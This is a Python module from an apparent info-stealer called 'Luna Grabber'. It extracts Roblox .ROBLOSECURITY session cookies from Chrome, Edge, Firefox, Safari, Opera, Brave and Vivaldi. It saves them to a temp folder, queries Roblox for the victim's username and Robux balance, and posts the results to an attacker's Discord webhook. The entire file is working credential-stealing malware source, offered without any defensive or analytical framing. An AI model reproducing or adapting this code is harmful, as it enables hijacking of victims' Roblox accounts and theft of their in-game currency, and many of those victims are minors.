import browser_cookie3
import os
import requests

class Roblox:
	def __init__(self):
		self.roblox_cookies = {}
		os.makedirs(os.path.join(temp_path, "Roblox"), exist_ok=True)
		self.grab_roblox_cookies()
		self.send_info()

	def grab_roblox_cookies(self):
		browsers = [
			('Chrome', browser_cookie3.chrome),
			('Edge', browser_cookie3.edge),
			('Firefox', browser_cookie3.firefox),
			('Safari', browser_cookie3.safari),
			('Opera', browser_cookie3.opera),
			('Brave', browser_cookie3.brave),
			('Vivaldi', browser_cookie3.vivaldi)
		]
		for browser_name, browser in browsers:
			try:
				browser_cookies = browser(domain_name='roblox.com')
				for cookie in browser_cookies:
					if cookie.name == '.ROBLOSECURITY':
						self.roblox_cookies[browser_name] = cookie.value
						self.save_cookie(browser_name, cookie.value)
			except Exception:
				pass

	def save_cookie(self, browser_name, cookie_value):
			file_path = os.path.join(temp_path, "Roblox", f"{browser_name} roblox cookies.txt")
			with open(file_path, 'w', encoding="utf-8") as f:
				f.write(cookie_value)
			
	def send_info(self):
		roblox_folder = os.path.join(temp_path, "Roblox")
		for file_name in os.listdir(roblox_folder):
			if file_name.endswith("roblox cookies.txt"):
				file_path = os.path.join(roblox_folder, file_name)
				with open(file_path, 'r', encoding="utf-8") as f:
					roblox_cookie = f.readline().strip()
					headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
					info = None
					try:
						response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
						response.raise_for_status()
						info = response.json()
					except Exception:
						pass

					if info is not None:
						data = {
							"embeds": [
								{
									"title": "Roblox Info",
									"color": 5639644,
									"fields": [
										{
											"name": "Name:",
											"value": f"`{info['UserName']}`",
											"inline": True
										},
										{
											"name": "<:robux_coin:1041813572407283842> Robux:",
											"value": f"`{info['RobuxBalance']}`",
											"inline": True
										},
										{
											"name": ":cookie: Cookie:",
											"value": "`Check Attachment For Roblox Cookie`",
											"inline": False
											
										},
									],
									"thumbnail": {
										"url": info['ThumbnailUrl']
									},
									"footer": {
										"text": "Luna Grabber | Created By Smug"
									},
								}
							],
							"username": "Luna",
							"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
						}
						requests.post(__CONFIG__['webhook'], json=data)